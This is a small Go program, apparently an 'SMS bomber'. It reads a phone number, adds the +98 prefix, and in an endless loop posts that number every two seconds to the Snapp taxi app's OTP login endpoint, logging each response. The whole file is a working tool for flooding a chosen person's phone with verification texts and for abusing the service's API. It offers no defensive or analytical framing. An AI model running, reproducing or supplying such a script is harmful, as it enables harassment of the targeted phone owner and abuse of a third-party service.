package main

import (
	"fmt"
	"github.com/fatih/color"
	"net/http"
	"net/url"
	"time"
)

// for fun
func main() {
	var phone string
	fmt.Print("Enter Phone number: ")
	fmt.Scanln(&phone)

	urlsend := "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
	mydata := url.Values{}
	mydata.Set("cellphone", "+98"+phone)

	for {
		resp, err := http.PostForm(urlsend, mydata)
		_ = resp
		if err != nil {
			color.Red("err", err)
		} else {
			fmt.Println("_______________________________")
			color.Green("version HTTP:", resp.Proto)
			color.Green("status :", resp.Status)
			color.Green("URL", resp.Request.URL)
			color.Green("HOST", resp.Request.Host)
			color.Green("TLS", resp.Request.TLS)
			fmt.Println("_______________________________")

		}
		time.Sleep(2 * time.Second)
	}
}
